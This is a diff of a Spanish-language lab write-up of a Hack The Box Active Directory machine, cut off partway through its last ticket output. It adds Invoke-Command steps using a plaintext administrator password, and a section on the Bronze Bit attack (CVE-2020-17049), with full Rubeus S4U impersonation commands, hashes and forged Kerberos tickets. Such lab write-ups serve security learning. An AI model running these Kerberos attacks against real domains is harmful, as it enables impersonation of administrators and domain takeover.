@@ -130,6 +130,7 @@
         <li><a href="#flag5">Gateway</a></li>
         <li><a href="#flag6">Celestial</a></li>
         <li><a href="#flag7">Dominion</a></li>
+        <li><a href="#extra">Extra</a></li>
       </ul>
   </div>
 
@@ -599,7 +600,7 @@ PS C:\Users\pc1\Desktop></span>
 
 <p class="plain-text">Volviendo al <code class="language-plaintext highlighter-rouge">powershell</code>, con <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> indicaremos el <code class="language-plaintext highlighter-rouge">hash</code> del ordenador <code class="language-plaintext highlighter-rouge">DEV$</code> suplantando al usuario <code class="language-plaintext highlighter-rouge">Administrator</code>, al hacerlo se nos importa un nuevo <code class="language-plaintext highlighter-rouge">ticket</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="am">.\Rubeus.exe </span><span class="p">s4u /user:DEV$ /domain:htb.local /dc:dc1.htb.local /self /altservice:http/dev.htb.local /rc4:01300a3009c7ae1af0ea216ebada48ad /impersonateuser:administrator /ptt  
+<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="am">.\Rubeus.exe </span><span class="p">s4u /user:DEV$ /rc4:01300a3009c7ae1af0ea216ebada48ad /impersonateuser:Administrator /altservice:http/dev.htb.local /domain:htb.local /dc:dc1.htb.local /self /ptt  
 
    ______        _
   (_____ \      | |
@@ -608,7 +609,7 @@ PS C:\Users\pc1\Desktop></span>
   | |  \ \| |_| | |_) ) ____| |_| |___ |
   |_|   |_|____/|____/|_____)____/(___/
 
-  v2.2.0
+  v2.2.3
 
 [*] Action: S4U
 
@@ -1325,7 +1326,7 @@ PS C:\Users\Administrator\Documents></span>
   | |  \ \| |_| | |_) ) ____| |_| |___ |
   |_|   |_|____/|____/|_____)____/(___/
 
-  v2.2.0
+  v2.2.3
 
 [*] Action: Calculate Password Hash(es)
 
@@ -1343,7 +1344,7 @@ PS C:\Users\Administrator\Documents></span>
 
 <p class="plain-text">Usando ese hash para el equipo <code class="language-plaintext highlighter-rouge">attackersystem$</code> en el dominio htb.local intentamos obtener un <code class="language-plaintext highlighter-rouge">ticket</code> suplantando a <code class="language-plaintext highlighter-rouge">Administrator</code>, sin embargo nos devuelve error</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">.\Rubeus.exe </span><span class="p">s4u /domain:htb.local /user:attackersystem$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:http/web.htb.local /ptt  
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">.\Rubeus.exe </span><span class="p">s4u /user:attackersystem$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:http/web.htb.local /domain:htb.local /ptt  
 
    ______        _
   (_____ \      | |
@@ -1352,7 +1353,7 @@ PS C:\Users\Administrator\Documents></span>
   | |  \ \| |_| | |_) ) ____| |_| |___ |
   |_|   |_|____/|____/|_____)____/(___/
 
-  v2.2.0
+  v2.2.3
 
 [*] Action: S4U
 
@@ -1434,8 +1435,7 @@ PS C:\Users\Administrator\Documents></span>
 
 <p class="plain-text">Al probar de nuevo crear el <code class="language-plaintext highlighter-rouge">ticket</code> pero esta vez suplantando al usuario <code class="language-plaintext highlighter-rouge">lee</code> nos logra generar un ticket e <code class="language-plaintext highlighter-rouge">importarlo</code> que nos servira para acceder a <code class="language-plaintext highlighter-rouge">web.htb.local</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">.\Rubeus.exe </span><span class="p">s4u /domain:htb.local /user:attackersystem$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:lee /msdsspn:http/web.htb.local /ptt  
-
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">.\Rubeus.exe </span><span class="p">s4u /user:attackersystem$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:lee /msdsspn:http/web.htb.local /domain:htb.local /ptt  
    ______        _
   (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
@@ -1443,7 +1443,7 @@ PS C:\Users\Administrator\Documents></span>
   | |  \ \| |_| | |_) ) ____| |_| |___ |
   |_|   |_|____/|____/|_____)____/(___/
 
-  v2.2.0
+  v2.2.3
 
 [*] Action: S4U
 
@@ -1565,8 +1565,12 @@ PS C:\Users\Administrator\Documents></span>
 
 <p class="plain-text">Sin embargo al hacerlo desde la <code class="language-plaintext highlighter-rouge">powershell</code> donde esta importado nuestro <code class="language-plaintext highlighter-rouge">ticket</code>, este se <code class="language-plaintext highlighter-rouge">autenticara</code> a la web con el y ahora nos devuelve un codigo de estado <code class="language-plaintext highlighter-rouge">200</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">PS C:\Users\Administrator\Documents> (</span><span class="am">Invoke-WebRequest </span><span class="c1">-UseBasicParsing -UseDefaultCredentials </span><span class="p">http://web.htb.local).StatusCode  
-200
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">Invoke-WebRequest </span><span class="c1">-UseBasicParsing -UseDefaultCredentials </span><span class="p">http://web.htb.local | </span><span class="am">Select </span><span class="p">StatusCode  
+
+StatusCode
+----------
+       200
+
 PS C:\Users\Administrator\Documents></span>
 </code></pre></div></div><br>
 
@@ -1794,6 +1798,18 @@ PS C:\Users\Administrator\Documents></span>
 </span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="ve">[+] </span><span class="p">htb.local\Administrator:Myp@ssw0rd </span><span class="am">(Pwn3d!)</span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Hay varias formas de ejecutar <code class="language-plaintext highlighter-rouge">comandos</code> en el <code class="language-plaintext highlighter-rouge">DC</code>, una de ellas es simplemente definiendo las <code class="language-plaintext highlighter-rouge">credenciales</code> y ejecutar comandos con <code class="language-plaintext highlighter-rouge">Invoke-Command</code> hacia <code class="language-plaintext highlighter-rouge">DC1</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="ve">$SecPassword </span><span class="c1">= </span><span class="am">ConvertTo-SecureString </span><span class="az">'Myp@ssw0rd' </span><span class="c1">-AsPlainText -Force</span><span class="p">
+PS C:\Users\Administrator\Documents> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential(</span><span class="az">'htb.local\Administrator'</span><span class="p">, </span><span class="ve">$SecPassword</span><span class="p">)  
+PS C:\Users\Administrator\Documents> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">dc1 </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command</span><span class="p"> { </span><span class="am">whoami</span><span class="p"> }
+htb\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">dc1 </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">hostname</span><span class="p"> }
+dc1
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+
 <p class="plain-text">Nos conectamos simplemente con <code class="language-plaintext highlighter-rouge">psexec</code> hacia el <code class="language-plaintext highlighter-rouge">DC1</code> con el parametro <code class="language-plaintext highlighter-rouge">-k</code> para autenticarnos por <code class="language-plaintext highlighter-rouge">kerberos</code> y obtenemos una <code class="language-plaintext highlighter-rouge">cmd</code> como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ proxychains </span><span class="p">-q impacket-psexec htb.local/Administrator:Myp@ssw0rd@dc1.htb.local -k  
@@ -1891,6 +1907,199 @@ PS C:\Users\Administrator.HTB\Documents> </span><span class="am">type</span><spa
 HADES{Tam1ng_Kerber0s_Wi1l_gRant_4cCess_t0_H4des}
 PS C:\Users\Administrator.HTB\Documents></span>
 </code></pre></div></div><br>
+</section>
+
+<section class="post" id="extra">
+<br><h3 class="post-title">Extra</h3>
+<h4 class="post-title">CVE-2020-17049 - Web Administrator</h4><br>
+
+<p class="plain-text">En el ataque de <code class="language-plaintext highlighter-rouge">GenericAll</code> hacia el equipo <code class="language-plaintext highlighter-rouge">WEB</code> habiamos visto que no nos dejaba generar el <code class="language-plaintext highlighter-rouge">ticket</code> suplantando al usuario <code class="language-plaintext highlighter-rouge">Administrator</code> y lo haciamos como <code class="language-plaintext highlighter-rouge">lee</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">.\Rubeus.exe </span><span class="p">s4u /user:attackersystem$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:cifs/web.htb.local /domain:htb.local /ptt /nowrap
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.3
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: 32ED87BDB5FDC5E9CBA88547376818D4
+[*] Building AS-REQ (w/ preauth) for: 'htb.local\attackersystem$'
+[*] Using domain controller: 192.168.3.203:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIE/jCCBPqgAwIBBaEDAgEWooIEFTCCBBFhggQNMIIECaADAgEFoQsbCUhUQi5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJaHRiLmxvY2Fso4ID0zCCA8+gAwIBEqEDAgECooIDwQSCA72who5gCTsmlPWtwyTntyoJhTOccEs7PlZgVDu+KWKXA4M4IGGI+xb02MJst/Px4bUlnfpvDASbJeFqvUqyLoIKKOx/PbQSp+zLYv/MH12qJJlF5ulGkK2mds5/U3GmJIQa1CuVu2Gj9VtUTmrBaonFr7E6R31kur0runoJSuxkeNednnb0Lq+ceSZkgeBr3F32sB0XiTtxKQLIeT+KUM8O3bkXG3rLELq99l/LjfluIoANmS2/2bzrKMqRdJAGHv6IGpJilugzWcbC3bD2Sr2QMDl2w03xmSRw6+gDKhc4AVFx7YZM/kDAMcB0aGN2fhzUZAZbJEGeCbsmZDPRhvOPDtMukhpUw8gP36WpB7/UL/ZYBo+XnNCMgn/sSy9Yy9vW7K3hJLfDW5VED8Po36PXn33ubRp6quuE44nSlmOM3CnQvC/tlOk3o14OrnxzpJ8F6wuIx3lAPUk+7tE7v2TertXVpOzCPpKJ2vJMEiJJvMW/nwesgQHQlNetEWiyeJ92Y/Mfm05elz2BgHrAdHTEF1byT+2LWLdee70Ie1FHaL4YWrtSH0Ss7RNJmDVm9Pn6dT1IiJ0i/9YqgTJ6F99iuHISzeLyhl9K+BLfZcUyZDiNf3BYbVO4w2fBUFgW0AZbviAGiz1wAQVve1dw++s1y1qfNrZdbCz4ezu/mcCZF287CoIaW0JZ+PMGmWHIdseJh6IbHRg0XPjiUFSpvCicMrUHJrRPCB9RCYmsSad27w6zCo2wP7dmIRyWOoFQXA3VVFVNxFHubaRIgT5ug0UEJnHcLRjkd43zlhf6mTvIJo3zzNru+cICXYVeqzbfU6+EbPHUp/4jFGYKZ02UoZqyiMCOGmOoJchSQR5xTxoN0KQsVBjbGn2tL5OJByDHPNOhtOCkQjATMDI3QSFGevJnGIjJr6BCjPBLQ4U9YUIz24TFi/b2/EoLtg0RuISqd/bB1/wlFilkvfm5bMexNImgnwyDEDSJWVD8d29mhJwTJYAocw259r+aW7URAhlHScYC+wQtooVPorhFXcuMNEHVZbqkGtOTCtjoBbW7juwcZK3UGTAWG18foCZfK112C19bVXdl9nPNTJHixxWzTwSJjmqIUsw9GBRH2Wh29gmMANwjUmzMg4BHg9DjbYtueG1D9iCLdzQNkNTHBhKiNY3YlObJFYAO9uBnlRCKUgm/S2cdd53Ksm7d8qar9MG2g0Qk8JkHI02SNSibn3Bjzm6LU8/4UH9ibjDglqieVsHGJJoe2TrBlKzRQDyGHGajgdQwgdGgAwIBAKKByQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBCaVmf4HAG9x1xe/xNwiFLAoQsbCUhUQi5MT0NBTKIcMBqgAwIBAaETMBEbD2F0dGFja2Vyc3lzdGVtJKMHAwUAQOEAAKURGA8yMDIzMDUxOTE5NTA1N1qmERgPMjAyMzA1MjAwNTUwNTdapxEYDzIwMjMwNTI2MTk1MDU3WqgLGwlIVEIuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCWh0Yi5sb2NhbA==
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'attackersystem$@HTB.LOCAL'
+[*] Using domain controller: dc1.htb.local (192.168.3.203)
+[*] Sending S4U2self request to 192.168.3.203:88
+[+] S4U2self success!
+[*] Got a TGS for 'Administrator' to 'attackersystem$@HTB.LOCAL'
+[*] base64(ticket.kirbi):
+
+      doIFQjCCBT6gAwIBBaEDAgEWooIEXTCCBFlhggRVMIIEUaADAgEFoQsbCUhUQi5MT0NBTKIcMBqgAwIBAaETMBEbD2F0dGFja2Vyc3lzdGVtJKOCBB0wggQZoAMCARehAwIBAaKCBAsEggQHTL+GuDZPlk5wM4gCQHNwMYcbXExh8ZNxVWSEIlU6MxJScLeuXN/nqQwkqNDU3LyjwMqZ6ZcGSNCzijKfe5A/SFnPeGPpmptc3nvurcdolSJ2kpkNfVXnDBRQBMGTs3B7R47ofzP51wSRA8T8rLMku3Aw2ZbPP9T9t6jZ0VAkwqusFrJ2027iwMuHxQZaDBBuEuyt1lnPVNOYcqsyJL/3YN54SzeD4+r+NBhGawr9p6PT5O9aeKmNKbpovbdPoDTrwZju3zC5L0jSs8Bpmxye2fh9xzDs/hteAg+LD277lrm+7cAb8OuLLbFWijBduJBRXHXCDnOAavyCNjvbB3eKf6qUsNbZb88y5YoI9hty2LWGMwuyv4dQVtShDtBf58zKtPtf2XYT3qDtiAKD2t+l4sRX+eTqnsRB7KdVmzHq13X24HJrvn8zzTGrgyiVtEY/qggRrIQTdcQKztCOTzr/G0mcgB0EOYDIOSvczdMc1ysZcWrC9OMjMqzqbtjU2GdvNd1NAVKBdINsiy4Zvb2UcIzIz1ybAVGbTn6VUFxbgG0p/OGgHN3vD1bYRy5Go58ewuHHF6P2WzubWAPHT3BLPgLedbsntj/vpVKzAPMZV6JB1YGCxfnq16U9YUs/tAc2iz3JCTiTmVqv5lsRO5RYawuU0UPA9Stokt9/kQFtZstaPFb/Q3M+AYvwY7Jvmko8h4EJUHW9iGOWRW4aSgc/Nn12jVrzvILTUqpOT+xRydTE5SK8ObsvR2GBpCAyyPigRy/JMvsQXzU0uCHoNyBIV692YTlxhXDCzww0RGM4FcevlyO4zNg8d+CEEmzq2MO5LAl1sSgq1Cz9QRP/ABP7zP3tANce4/9GE//PEtAOA0JrqFGwuAHGeH75ZxrS+0+K489OOMLf+5O6sN4k7bWGHTAIGWxceHn4R8ZzOWSP169BXD8mmy2cOSoRNr3NqKqGtZwfEwjpMsXtxW+5BLDXTwQOW5P5gu2rl4nllx7/S9HTmPC0SNWwwg+HwtHwVkG51aroChhxXzcQFMiun97eenEYUNBy/94v95ynHNFpRDYnniNWADcrdXM2mqXf8NYjoy7otegXcLrVJw09tyC7QMyCCwqXnFA1/i7njdfABVNmPGDknZ8SFfZ7JnDklJiEkq5R0U3A/nWUaFIq7/tDEbNO0X3oGjYu0xJayNI8b8QyTQdrwmw1+rJ6MM3ZAkxcvEdEGRhXSwkjVqeaGfHblHRX25EerWKkhZfWcHECUFFgKbhOczc7jdl0y2GOh1QRc7Xx6qC5CMCs4TRjI+iKwIWM7fL5bpeuNqWZog8ziZT0G7dWHk6NKMTwfPhJU9TxtD8xYl6CTUCxR09w+s5OTXTCw+Kq4JOjgdAwgc2gAwIBAKKBxQSBwn2BvzCBvKCBuTCBtjCBs6AbMBmgAwIBF6ESBBB9JGEFheiVht8O+2GfLGDmoQsbCUhUQi5MT0NBTKIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3KjBwMFAAChAAClERgPMjAyMzA1MTkxOTUwNThaphEYDzIwMjMwNTIwMDU1MDU3WqcRGA8yMDIzMDUyNjE5NTA1N1qoCxsJSFRCLkxPQ0FMqRwwGqADAgEBoRMwERsPYXR0YWNrZXJzeXN0ZW0k  
+
+[*] Impersonating user 'Administrator' to target SPN 'cifs/web.htb.local'
+[*] Building S4U2proxy request for service: 'cifs/web.htb.local'
+[*] Using domain controller: dc1.htb.local (192.168.3.203)
+[*] Sending S4U2proxy request to domain controller 192.168.3.203:88
+
+[X] KRB-ERROR (13) : KDC_ERR_BADOPTION
+
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Hay un metodo alternativo que es aprovechando el <a href="https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-theory/">CVE-2020-17049</a> o <code class="language-plaintext highlighter-rouge">Bronze Bit</code> Attack que nos permite falsiciar el <code class="language-plaintext highlighter-rouge">ticket</code> cuando somos un usuario de <code class="language-plaintext highlighter-rouge">servicio</code>, por suerte <code class="language-plaintext highlighter-rouge">Rubeus</code> tiene contemplado esto con solo el parametro <code class="language-plaintext highlighter-rouge">/bronzebit</code>, con esto nos genera el <code class="language-plaintext highlighter-rouge">ticket</code> suplantando al usuario <code class="language-plaintext highlighter-rouge">Administrator</code> sin problemas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">.\Rubeus.exe </span><span class="p">s4u /user:attackersystem$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:cifs/web.htb.local /domain:htb.local /ptt /nowrap /bronzebit
+
+   ______        _                       
+  (_____ \      | |                      
+   _____) )_   _| |__  _____ _   _  ___  
+  |  __  /| | | |  _ \| ___ | | | |/___) 
+  | |  \ \| |_| | |_) ) ____| |_| |___ | 
+  |_|   |_|____/|____/|_____)____/(___/  
+
+  v2.2.3
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: 32ED87BDB5FDC5E9CBA88547376818D4
+[*] Building AS-REQ (w/ preauth) for: 'htb.local\attackersystem$' 
+[*] Using domain controller: 192.168.3.203:88 
+[+] TGT request successful! 
+[*] base64(ticket.kirbi):
+
+      doIE/jCCBPqgAwIBBaEDAgEWooIEFTCCBBFhggQNMIIECaADAgEFoQsbCUhUQi5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJaHRiLmxvY2Fso4ID0zCCA8+gAwIBEqEDAgECooIDwQSCA735w5H87Rqj/DhdbzBcbYACTUhvt/kUxwNZuxNOqQqRzYWl6I/RuoY3dDr3d9H1C6GUDbOQtrwk/z3JTj5pZQYwtGXezJmSoRT8iMST3Ui7/ZOd7B25Fe7hrBYCrzNq5ey60VPTuXj+pqj8hPzYlVkxt+XCU5kgg7u9C/LQAyiR0z02pRlTrmDaEvc+27JrpFOeAhQ7sBRIk/NJHUz4GuH3pyNkowjI3DYOnjfZGOTVyrH8HbwZvm3YL1wTlGWpgLoWQyE805JTxYiGxO11ShD92YVb0o4vah7YXae9YxzmZM87NISAeIXu8WYcWZcFM51nGx6xvilpkI4v1gRlNDRNtzD2GprD+mM8Lml9YWjzs75GNPYopUmeOA+eBK+tbo+tXJHUmxZiecfNaeWdzcFYkKhGutFPL/+OaBKbJYAl8IV7qU3v5JgbBNmuPvnHB8swRkvy4ZeDlGDyeiPuBc+jPQmxtOMlg6m2iGzxNssDafVyIp5lewdNOKlwrd+zdMLbVcM1iT4i4qt63pMVFL5ZREK6Y9G5Fp3KSHBOR54yFlHf7Zs4JtzjHcWKzE06lhVmlRQTCFK77LHckYJAf7TKxj0jYRfVGVmWrqZ8FSyG/3wc3A2ovXxSFfxxdCeiLUnoKuqcNNKHahRq0x8OFrx1MsUarYJeyulp8D64x2oOpd9Z0yUHeQPFdRwFLnhDIv8AnSBIh3+tI3eik/KDK02eaPcStWI2auyiuy4saXE6ath5aJ2sQ1VS9hux3kfvnSnZBxgkWmeWXRSyhU0C5VaV4oXsWrzt7Qcj0hah/J3pC+9Op4JSc/0v/8FmL9EKROL61Gtm0cXQew8azAcMps62frKoWf4Nv5ZDiQC4kbNndR5H/ifjE3e2tqx0h08qTNZxCFGVn1bxCBoiunWfiWakZxEh7v/WaxzcNIUhLe9u/D5PsMz6PaXCgsVohTLjTfXTeQnnGsairz7gEpTR/uGWplpdhHX0+49WpLOUrjtBwblAQD1HpgCjEgbwQusWWK8sCY4Ikx9cNUY3cxzLXjnO26644u7Ztbc1nwmg0/1tDP69c5yERj34ThjhDzSPe/1cqZrDzzAmBAHaHFUbpLdW4mUQYqP5ABc5priQbWc4RgPPkxiaHqEIj4PW7jAxiGb61hSfUdr07BZ/PviGq8dvSdSVc+5KcNC7mmY56AvWNFhP3OtPRXIyFDANaiHFB67RCJXmFvgzMytlmEH7xcU9I1BUqpmF0WiiryTOJRmWC91HJlpZHIkL3DWNvDOjgdQwgdGgAwIBAKKByQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBAQln/A5RJnLMuVjTnGBGWloQsbCUhUQi5MT0NBTKIcMBqgAwIBAaETMBEbD2F0dGFja2Vyc3lzdGVtJKMHAwUAQOEAAKURGA8yMDIzMDUxOTA0MjIyOFqmERgPMjAyMzA1MTkxNDIyMjhapxEYDzIwMjMwNTI2MDQyMjI4WqgLGwlIVEIuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCWh0Yi5sb2NhbA==
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'attackersystem$@HTB.LOCAL'
+[*] Using domain controller: dc1.htb.local (192.168.3.203)
+[*] Sending S4U2self request to 192.168.3.203:88
+[+] S4U2self success!
+[*] Bronze Bit flag passed, flipping forwardable flag on. Original flags: name_canonicalize, pre_authent, renewable
+[*] Flags changed to: name_canonicalize, pre_authent, renewable, forwardable
+[*] Got a TGS for 'Administrator' to 'attackersystem$@HTB.LOCAL'
+[*] base64(ticket.kirbi):
+
+      doIFOjCCBTagAwIBBaEDAgEWooIEVTCCBFFhggRNMIIESaADAgEFoQsbCUhUQi5MT0NBTKIcMBqgAwIBAaETMBEbD2F0dGFja2Vyc3lzdGVtJKOCBBUwggQRoAMCARehAwIBAaKCBAMEggP/uVyqshvb2mcTlsJL0gHsmck94hc3Xq5wYPK1LBOg/+bukck0ocNNrT6Ztybr+M/Uzw+n2Enit92wtWUPL7/lD2CtdHX68fWNjKFGF953Lvs5oQYC5PGfcWSvBH6ufXpdagq/kM0UmCX5IA0BzSqR3aNkP/YIcWW+pjBcDjTKQllCJsGNwZR9TXHX/n3yeqiQ3zkns9eKKMleJHJFFplDCYU5H7GGgePCuKhihwlSyWK4Q3+hY9iXjg/j+DMJmggx8rE3/oLaV28v5lAVm4qK3CpKzSMyJQi176VHEVtRiRdtnq3Ct9zHJI5/j1sZNVNJyN/d2uORgh7WUS1QeYa7Ffv0tZUF+QtUGtdFkHafGQ1oaXAw92DhXdS/dLumB548C3g21UAuGA1nq/7tJiEzjS6XUrB0B+FB9cwWu3S8B1g721TM0sEdfOIc+yWXCq6/fHuyq6MnW9sob5UnmElP5Ph8j/2YYx/30Lmv3FenLjgnnOup/DebSTxF3qCBTyqGWO+LdSN/cOGORFjdQEJHKP9fokbQ/RR70NgXivx1ZGHTmIF6tuHKTGEOVDEUyi5oqDxf518zahjgzakrWz0p91z+TM8HcZoW5m3xhjtmyMjRjWV8MdwxLuja0W/hWwW640jle+N/t28ancsMx/AqUcQ8p7DwvY8pjQgdhr81wXvwHT5ab5cQmdlDu7vLEna3ibHYqFC/HM3ntyNV7Zc0YGE0TTMfo4r0/aCF95XkMWzxH/DH+EUYgkswjPSQuN4t+sfd90/Kz3JHRyJzZwRYAbijyy4e3ozeuRQ6nsWQ0UdD6yh1oEQ+I+SjEsYMj4yrQZCb+w+zw9uqyITPPrAOFv6bthRJrfLtBYrNwJahVqZD3DYyDJZFOWyuFMwhxoNRccZsAD6gfkN0W5Nmc9oFF6khEyj0Edt6lCr2Tf4/GsqXBD8N/A8YrbOHnzb0KpSQcVHHeY6zeyGdeu1erJ4jrlDgB7uW5GWmqxiD5rINDHmikXHZryij9yZuPiKtUzvF9Q7mkowYbglqqsKmdkx4zuXZ3JsmwfRm2q9i7wNmipfPKRFl2816DZH5c/Cjj274WyVi7K7rmM30yNdStVpjlIpmDT5SudmmEUzRyfb8gYotZN1hTiJi+LZkI68l42lxsIdgR8+hUq4YGyxwyTFnjbJK7mK1rUEzDqqzVShWrEkM607PV62P+POj6pMujrW+tVnwjzMTCopGgA7FX6XpWiLnM0nScA5aAGitw3yTPD9usKNnTrmaTKAxPbvw4SrUVRsD/WqH8o5U1lrjgYQt0rj282V3z8tKX0HhL9W3+c15EYR93WGE0Mo8syFOEsolmW527hrl4gim+5PYzB9io4HQMIHNoAMCAQCigcUEgcJ9gb8wgbyggbkwgbYwgbOgGzAZoAMCARehEgQQEjrqRtoSppUB+SsuA+B6YqELGwlIVEIuTE9DQUyiGjAYoAMCAQqhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBAoQAApREYDzIwMjMwNTE5MDQyMjI4WqYRGA8yMDIzMDUxOTE0MjIyOFqnERgPMjAyMzA1MjYwNDIyMjhaqAsbCUhUQi5MT0NBTKkcMBqgAwIBAaETMBEbD2F0dGFja2Vyc3lzdGVtJA==
+
+[*] Impersonating user 'Administrator' to target SPN 'cifs/web.htb.local'
+[*] Building S4U2proxy request for service: 'cifs/web.htb.local'
+[*] Using domain controller: dc1.htb.local (192.168.3.203)
+[*] Sending S4U2proxy request to domain controller 192.168.3.203:88
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/web.htb.local':
+
+      doIF7jCCBeqgAwIBBaEDAgEWooIFBTCCBQFhggT9MIIE+aADAgEFoQsbCUhUQi5MT0NBTKIgMB6gAwIBAqEXMBUbBGNpZnMbDXdlYi5odGIubG9jYWyjggTBMIIEvaADAgESoQMCAQmiggSvBIIEq28Frd5kCewl7oEGN52EWfmE65k0XChRWJyrBDvDDdEg1AtBp/YLfIw9mosB1Y/WSivY2Zx9UGCeDdavmPrEgsM6Qz5LVgWmaLgpnb8gIrXIrxcLQ+9scVc3NgC2BDutjDRiFmyZZ+OE7wQ8xeWuBB/ntbxOwbDNTSkjqjJOB8QqeZ89fMDbAiGfO2LPG7nblSMfItQJZwELQvToHq++IRPbDhReUmCPnLlCRy5/9hUxAgJBP4n2jjuyunS8dwZ0RmaEw+liBH5wnK0BPdasZ/uhVUe2Yk5/OHR8Epd8A2pynJp84u9OZZ9n9H8hfYmxOppaymo/v2IKnSQhrYXBvuq1kWzTsMd0iEtWSgLSy0IV3LcvlCr5T4nCRX4ZTA45aCNS/P69AbSCcLNvY6xWGOLKpAmcZ7Bb+9j/P8JI/rdVyyGVIbFdgSReIAytkseXxMGuUdl8TYA1S/ojBIViujB1CgpLyFyibY8GXRvXD3kIcyIrFkn6PDOszlsYQwfk1xQyNfeWI7Wm9PCtQCQPyfFhkhR+I95ousXqIgJzsXwp5ghCiccgstBZdaKbM+jJ36BQJdeUjt5e6JtdEfr+CWMRsVCpolRFZlHen97ITKzPjRdQIS+N6alcAdh49HrF28qS14OE5U0ZO7ipOt9xTGckDukoDn1MegdqHro5z073rMmd7+X2ueX1pnj5XEAkEEUwnY+oPyC8z5up2DqRPFmSn9t+4OCaBytzx7erNWtKl0mG24h8XBeOtgOCvzzlP4QXMMLGLzd5IZsh1JbjcLz4aMZtIqmIHiiNkqlgFcOl0xVWwKz8HXhRdiRtJ/VkX42hoDzI9FzA6r18UBHJfYgqNVpAn/Ycn6eictE7L4wC58YqSGp9DMo481gNGMp7i6qdoeVoN8sUiIIymZHai9ia09u5S44Re/3sPE7G2mBLtrah1+OVFhYzwhbOH7pMbPxzY+TQ9Ubbbu16dNBsmVmuxRGuvDd1eGZD4TKN4CIVTDhO3sP5vj559EfNyjtYEv1hZuKxVTSzDnI46yHOQkBmxJAT7vDlAUCWaZeYOtByS+hOvNUC8XC1obAhvYM74S4vfi5xbwc5a3j/wXGb6BkhIqvUzldRmMEupKNmTyTngBjJrDIQBIJ/v2nmvEm27ZQwx+rHbrJQUTJoHeqSPpJDSKkBc3EpRhhXbED1TXJpD070Wgu9alEmCyoNzpGilnv6Ujmvui0yuV6JcipH2iHX4SkfChWG8dGvHYio/IzYdNL6gpwNlhkSGcNiFdNkMOu53KqQTuKNH9rQ5p99Cog1vhrG6Pg7TipEciLM0SMDLOgDwtMtQEvcMpyH/TbYMN1YUaqHt5kRMLprgNy1oY990bxfwwEopmReQGmXVwOHJ7Lu8N2uWo+E49VMzytGRLMjvfp2Tmz4XRRoRw/Sa8rE/tKXo5LUiCcvAvwlSwi66pgMzBzP1pbTySszV1kLxAqzbUL9sOkDGN6TOl5Tz71sb6MogVlAHHYfd63LYaG4ZtL/AYYDEA4ArL051C8KZrxH6EFB98R1MCWyHYNzRntSSUnpo6UUaYwU9iDe7EAIDIq92aNbtY+PW8OjgdQwgdGgAwIBAKKByQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBEaESBBAp3MDGn8cpfJCn5gOjnLqWoQsbCUhUQi5MT0NBTKIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3K